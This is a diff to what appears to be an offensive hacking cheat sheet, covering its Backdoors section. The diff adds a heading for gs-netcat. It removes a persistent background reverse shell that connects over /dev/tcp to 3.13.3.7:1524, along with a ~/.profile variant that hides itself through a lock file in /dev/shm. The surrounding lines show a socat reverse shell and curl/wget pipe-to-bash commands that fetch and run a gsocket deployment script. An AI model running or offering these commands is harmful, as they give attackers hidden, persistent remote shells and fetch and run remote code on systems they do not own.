@@ -1732,7 +1732,11 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 <a id="backdoor"></a>
 ## 6. Backdoors
 
+See [Reverse Shell / Dumb Shell](#reverse-shell) for simple 1-liner reverse shells.
+
 <a id="gsnc"></a>
+**6.i. Reverse shell using gs-netcat**
+
 Mostly we use gs-netcat's automated deployment script: [https://www.gsocket.io/deploy](https://www.gsocket.io/deploy).
 ```sh
 bash -c "$(curl -fsSLk https://gsocket.io/y)"
@@ -1745,22 +1749,6 @@ bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/y)"
 or deploy gsocket by running your own deployment server:
 ```sh
 LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/ys)"  # Notice '/ys' instead of '/y'
-```
-
-See [Reverse Shell / Dumb Shell](#reverse-shell) for simple 1-liner reverse shells.
-
-<a id="backdoor-background-reverse-shell"></a>
-**6.i. Background reverse shell**
-
-A reverse shell that keeps trying to connect back to us every 360 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. 
-
-```sh
-setsid bash -c 'while :; do bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done' &>/dev/null
-```
-
-or the user's *~/.profile* (also stops multiple instances from being started):
-```sh
-fuser /dev/shm/.busy &>/dev/null || nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 ; sleep 360; done' &>/dev/null &
 ```
 
 <a id="backdoor-auth-keys"></a>
